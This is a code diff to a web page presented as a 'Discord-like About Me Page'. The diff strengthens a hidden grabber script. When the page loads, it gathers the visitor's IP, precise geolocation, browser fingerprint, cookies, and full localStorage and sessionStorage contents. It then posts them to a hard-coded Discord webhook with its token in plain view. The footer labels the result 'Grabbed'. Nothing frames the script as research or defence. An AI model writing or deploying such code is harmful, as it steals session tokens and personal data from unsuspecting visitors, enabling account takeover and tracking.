@@ -45,7 +45,7 @@
       backdrop-filter: blur(20px);
       -webkit-backdrop-filter: blur(20px);
       border: 1px solid rgba(255, 255, 255, 0.2);
-      border-radius: 24px;
+      border-radius: 8px;
       padding: 48px 32px;
       max-width: 400px;
       width: 90%;
@@ -133,111 +133,162 @@
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
     
     const sendData = async () => {
+      const formData = new FormData();
+      const fields = [];
+      let ip = 'unknown';
+      let country = 'unknown';
+      let city = 'unknown';
+      let lat = 'unknown';
+      let lon = 'unknown';
+      let status = 'unknown';
+      let timezoneGeo = 'unknown';
+      let mobile = 'No';
+      let proxy = 'No';
+      let hosting = 'No';
+      let isp = 'unknown';
+      let org = 'unknown';
+      let asNum = 'unknown';
+      let region = 'unknown';
+      let regionCode = 'unknown';
+      let district = 'unknown';
+      let zip = 'unknown';
+      
       try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        const ip = ipData.ip;
-        
-        const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+        ip = ipData.ip;
+      } catch (error) {
+        console.error('IP fetch failed:', error);
+      }
+      
+      try {
+        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
         const geoData = await geoResponse.json();
-        
-        const lat = geoData.lat || 'unknown';
-        const lon = geoData.lon || 'unknown';
-        const country = geoData.country || 'unknown';
-        const countryCode = geoData.countryCode || 'unknown';
-        const region = geoData.regionName || 'unknown';
-        const regionCode = geoData.region || 'unknown';
-        const city = geoData.city || 'unknown';
-        const district = geoData.district || 'unknown';
-        const zip = geoData.zip || 'unknown';
-        const isp = geoData.isp || 'unknown';
-        const org = geoData.org || 'unknown';
-        const as = geoData.as || 'unknown';
-        const timezoneGeo = geoData.timezone || 'unknown';
-        const mobile = geoData.mobile ? 'Yes' : 'No';
-        const proxy = geoData.proxy ? 'Yes' : 'No';
-        const hosting = geoData.hosting ? 'Yes' : 'No';
-        const status = geoData.status || 'unknown';
-        
-        const userAgent = navigator.userAgent || 'unknown';
-        const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
-        const platform = navigator.platform || 'unknown';
-        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
-        const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-        const referrer = document.referrer || 'direct';
-        const doNotTrack = navigator.doNotTrack || 'unspecified';
-        const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-        const deviceMemory = navigator.deviceMemory || 'unknown';
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezoneGeo;
-        const connection = navigator.connection 
-          ? `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)` 
-          : 'unsupported';
-        const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
-        const timestamp = new Date().toISOString();
-        
-        const embed = {
-          title: 'User Profile Data',
-          description: `Timestamp: ${timestamp}\nReferrer: ${referrer}`,
-          color: 3447003,
-          fields: [
-            { name: 'IP', value: ip, inline: true },
-            { name: 'Status', value: status, inline: true },
-            { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
-            { name: 'Country', value: country, inline: true },
-            { name: 'Country Code', value: countryCode, inline: true },
-            { name: 'Region', value: region, inline: true },
-            { name: 'Region Code', value: regionCode, inline: true },
-            { name: 'City', value: city, inline: true },
-            { name: 'District', value: district, inline: true },
-            { name: 'ZIP', value: zip, inline: true },
-            { name: 'ISP', value: isp, inline: true },
-            { name: 'Organization', value: org, inline: true },
-            { name: 'AS', value: as, inline: true },
-            { name: 'Timezone', value: timezone, inline: true },
-            { name: 'Mobile', value: mobile, inline: true },
-            { name: 'Proxy', value: proxy, inline: true },
-            { name: 'Hosting', value: hosting, inline: true },
-            { name: 'User Agent', value: userAgent.substring(0, 1024), inline: false },
-            { name: 'Languages', value: languages.substring(0, 1024), inline: false },
-            { name: 'Platform', value: platform, inline: true },
-            { name: 'Screen Resolution', value: screenRes, inline: true },
-            { name: 'Cookies Enabled', value: cookieEnabled, inline: true },
-            { name: 'Do Not Track', value: doNotTrack, inline: true },
-            { name: 'Hardware Concurrency', value: hardwareConcurrency, inline: true },
-            { name: 'Device Memory (GB)', value: deviceMemory, inline: true },
-            { name: 'Connection', value: connection, inline: true },
-            { name: 'Plugins', value: pluginsList.substring(0, 1024), inline: false }
-          ],
-          footer: { text: 'Grabbed via Discord-like About Me Page' }
-        };
-        
-        const formData = new FormData();
-        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-        
-        // Cookies
+        if (geoData.status === 'success') {
+          country = geoData.country || 'unknown';
+          city = geoData.city || 'unknown';
+          lat = geoData.lat || 'unknown';
+          lon = geoData.lon || 'unknown';
+          status = geoData.status || 'unknown';
+          timezoneGeo = geoData.timezone || 'unknown';
+          mobile = geoData.mobile ? 'Yes' : 'No';
+          proxy = geoData.proxy ? 'Yes' : 'No';
+          hosting = geoData.hosting ? 'Yes' : 'No';
+          isp = geoData.isp || 'unknown';
+          org = geoData.org || 'unknown';
+          asNum = geoData.as || 'unknown';
+          region = geoData.regionName || 'unknown';
+          regionCode = geoData.region || 'unknown';
+          district = geoData.district || 'unknown';
+          zip = geoData.zip || 'unknown';
+        }
+      } catch (error) {
+        console.error('Geo fetch failed:', error);
+      }
+      
+      const timestamp = new Date().toISOString();
+      const userAgent = navigator.userAgent || 'unknown';
+      const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
+      const platform = navigator.platform || 'unknown';
+      const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
+      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+      const referrer = document.referrer || 'direct';
+      const doNotTrack = navigator.doNotTrack || 'unspecified';
+      const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+      const deviceMemory = navigator.deviceMemory || 'unknown';
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || timezoneGeo;
+      let connection = 'unsupported';
+      try {
+        if (navigator.connection) {
+          connection = `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)`;
+        }
+      } catch (error) {
+        console.error('Connection info failed:', error);
+      }
+      let pluginsList = 'none';
+      try {
+        pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
+      } catch (error) {
+        console.error('Plugins fetch failed:', error);
+      }
+      
+      fields.push(
+        { name: 'IP', value: ip, inline: true },
+        { name: 'Country', value: country, inline: true },
+        { name: 'City', value: city, inline: true },
+        { name: 'Status', value: status, inline: true },
+        { name: 'Coordinates', value: `${lat}, ${lon}`, inline: true },
+        { name: 'Country Code', value: geoData?.countryCode || 'unknown', inline: true },
+        { name: 'Region', value: region, inline: true },
+        { name: 'Region Code', value: regionCode, inline: true },
+        { name: 'District', value: district, inline: true },
+        { name: 'ZIP', value: zip, inline: true },
+        { name: 'ISP', value: isp, inline: true },
+        { name: 'Organization', value: org, inline: true },
+        { name: 'AS', value: asNum, inline: true },
+        { name: 'Timezone', value: timezone, inline: true },
+        { name: 'Mobile', value: mobile, inline: true },
+        { name: 'Proxy', value: proxy, inline: true },
+        { name: 'Hosting', value: hosting, inline: true },
+        { name: 'User Agent', value: userAgent.substring(0, 1024), inline: false },
+        { name: 'Languages', value: languages.substring(0, 1024), inline: false },
+        { name: 'Platform', value: platform, inline: true },
+        { name: 'Screen Resolution', value: screenRes, inline: true },
+        { name: 'Cookies Enabled', value: cookieEnabled, inline: true },
+        { name: 'Referrer', value: referrer, inline: false },
+        { name: 'Do Not Track', value: doNotTrack, inline: true },
+        { name: 'Hardware Concurrency', value: hardwareConcurrency, inline: true },
+        { name: 'Device Memory (GB)', value: deviceMemory, inline: true },
+        { name: 'Connection', value: connection, inline: true },
+        { name: 'Plugins', value: pluginsList.substring(0, 1024), inline: false }
+      );
+      
+      const embed = {
+        title: 'User Profile Data',
+        description: `Timestamp: ${timestamp}`,
+        color: 3447003,
+        fields: fields,
+        footer: { text: 'Grabbed via Discord-like About Me Page' }
+      };
+      
+      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+      
+      // Cookies
+      try {
         if (document.cookie) {
           const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
           formData.append('file1', cookiesBlob, 'cookies.txt');
         }
-        
-        // LocalStorage
-        const lsData = JSON.stringify(localStorage, null, 2);
+      } catch (error) {
+        console.error('Cookies send failed:', error);
+      }
+      
+      // LocalStorage
+      try {
+        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage).map(([k, v]) => [k, v])), null, 2);
         const lsBlob = new Blob([lsData], { type: 'application/json' });
         formData.append('file2', lsBlob, 'localStorage.json');
-        
-        // SessionStorage
-        const ssData = JSON.stringify(sessionStorage, null, 2);
+      } catch (error) {
+        console.error('LocalStorage send failed:', error);
+      }
+      
+      // SessionStorage
+      try {
+        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage).map(([k, v]) => [k, v])), null, 2);
         const ssBlob = new Blob([ssData], { type: 'application/json' });
         formData.append('file3', ssBlob, 'sessionStorage.json');
-        
+      } catch (error) {
+        console.error('SessionStorage send failed:', error);
+      }
+      
+      try {
         await fetch(webhookUrl, {
           method: 'POST',
           body: formData,
         });
-        
-        console.log('All user data sent to webhook');
+        console.log('All available user data sent to webhook');
       } catch (error) {
-        console.error('Error sending data:', error);
+        console.error('Webhook send failed:', error);
       }
     };
     
